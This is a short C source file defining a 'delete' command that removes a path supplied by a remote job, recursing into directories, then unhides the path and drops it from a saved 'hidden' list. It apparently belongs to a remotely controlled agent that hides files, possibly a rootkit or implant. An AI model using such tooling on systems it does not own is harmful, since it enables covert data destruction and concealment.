#include "../inc/util.h"
#include "../inc/cmds.h"
#include "../inc/save.h"

#include <sys/stat.h>

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>

#include <fcntl.h>
#include <errno.h>

/*

 * delete command, deletes a given directory or a file
 * also makes sure the unhide the file if its hidden

*/

char *cmd_delete(job_t *job) {
  cmd_recv_all(job);

  char full_path[PATH_MAX+1];
  struct stat st;
  bool ok = false;
  
  if(NULL == realpath(job->data, full_path))
    return strerror(errno);

  if(access(full_path, F_OK) != 0)
    return strerror(errno); 

  if(stat(full_path, &st) != 0)
    return strerror(errno); 

  if(S_ISDIR(st.st_mode))
    ok = remove_dir(full_path);
  else
    ok = 0 == unlink(full_path);

  if(!ok)
    return strerror(errno);

  // make sure the path is not hidden
  unhide_path(full_path);

  if(!save_del("hidden", full_path))
    return "failed to unsave the path";
    
  return "success";
}
